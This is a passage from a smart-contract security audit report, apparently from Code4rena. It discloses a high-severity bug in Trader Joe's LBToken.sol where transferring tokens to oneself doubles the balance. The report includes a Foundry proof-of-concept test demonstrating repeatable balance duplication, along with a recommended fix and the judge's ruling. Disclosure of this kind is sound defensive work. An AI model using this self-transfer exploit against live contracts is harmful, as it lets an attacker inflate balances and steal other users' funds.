@@ -1,0 +1,17 @@
+[H-01] Transfering funds to yourself increases your balance
+Submitted byDravee, also found bybitbopper,hansfriese,saian,Tutturu,JMukesh,__141345__,neumo,parashar,Randyyy,phaze,hxzy,Lambda,cccz,SEVEN,ne0n,8olidity, andRaoulSchaffranek
+https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192
+Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that_toBalancecan overwrite_fromBalance:
+File:LBToken.sol176:function_transfer(177:address_from,178:address_to,179:uint256_id,180:uint256_amount181:     )internalvirtual{182:uint256_fromBalance=_balances[_id][_from];...187:uint256_toBalance=_balances[_id][_to];188:189:unchecked{190:_balances[_id][_from] =_fromBalance-_amount;191:_balances[_id][_to] =_toBalance+_amount;//@audit : if _from == _to : rekt192:         }..196:     }
+Furthermore, thesafeTransferFromfunction has thecheckApprovalmodifier which passes without any limit if_owner == _spender:
+File:LBToken.sol32:modifiercheckApproval(address_from,address_spender) {33:if(!_isApprovedForAll(_from,_spender))revertLBToken__SpenderNotApproved(_from,_spender);34:_;35:     }...131:functionsafeTransferFrom(...136:     )publicvirtualoverridecheckAddresses(_from,_to)checkApproval(_from, msg.sender) {...269:function_isApprovedForAll(address_owner,address_spender)internalviewvirtualreturns(bool) {270:return_owner==_spender||_spenderApprovals[_owner][_spender];271:     }
+Proof of Concept
+Add the following test toLBToken.t.sol(run it withforge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv):
+functiontestSafeTransferFromOneself()public{uint256amountIn=1e18;(uint256[]memory_ids, , , ) =addLiquidity(amountIn,ID_ONE,5,0);uint256initialBalance=pair.balanceOf(DEV,_ids[0]);assertEq(initialBalance,333333333333333333);// using hardcoded value to ease understandingpair.safeTransferFrom(DEV,DEV,_ids[0],initialBalance);//transfering to oneselfuint256rektBalance1=pair.balanceOf(DEV,_ids[0]);//computing new balanceassertEq(rektBalance1,2*initialBalance);// the new balance is twice the initial oneassertEq(rektBalance1,666666666666666666);// using hardcoded value to ease understanding}
+As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it’s passing. This can be repeated again and again to increase your balance.
+Recommended Mitigation Steps
+Add checks to make sure that_from != _tobecause that shouldn’t be useful anywayPrefer the following:
+File:LBToken.sol189:unchecked{190:_balances[_id][_from] -=_amount;191:_balances[_id][_to] +=_amount;192:         }
+0x0Louis (Trader Joe) confirmed
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.
